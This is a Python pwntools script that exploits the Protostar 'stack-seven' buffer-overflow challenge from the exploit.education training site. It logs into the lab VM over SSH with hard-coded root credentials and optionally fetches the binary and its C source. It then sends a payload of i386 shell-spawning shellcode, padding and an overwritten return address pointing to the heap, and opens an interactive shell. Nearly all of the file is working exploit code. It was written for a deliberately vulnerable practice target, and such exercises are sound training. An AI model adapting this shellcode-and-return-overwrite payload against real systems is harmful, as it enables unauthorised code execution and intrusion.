__author__ = '@tomereyz'
from pwn import *
import requests
from bs4 import BeautifulSoup

context.clear(arch='i386')


def main(download):
    host = 'protostar'
    passowrd = 'godmode'
    user_name = 'root'
    challenge_name = 'stack-seven'
    challenge_name_opt = 'stack7'
    challenge_port = 22

    ssh_client = ssh(user=user_name, host=host, password=passowrd, port=challenge_port)
    if download:
        ssh_client.download('/opt/protostar/bin/{}'.format(challenge_name_opt))
        resp = requests.get(
            'https://exploit.education/protostar/{challenge_name}/'.format(challenge_name=challenge_name))
        bs_obj = BeautifulSoup(resp.content, 'html.parser')
        with open('{challenge_name_opt}.c'.format(challenge_name_opt=challenge_name_opt), 'w') as f:
            f.write(bs_obj.find_all('code', {'class': 'language-c'})[0].text)

    e = ELF(challenge_name_opt)
    shell_code = asm(shellcraft.i386.linux.sh())

    heap_str = 0x804a008

    payload = shell_code + cyclic(80 - len(shell_code)) + pack(heap_str, word_size=32)
    r = ssh_client.process('/opt/protostar/bin/{}'.format(challenge_name_opt))
    # gdb.attach(r, '')
    # pause()
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main(download=True)

# 0xb7e43420 libc
# 0xb7e43420 libc
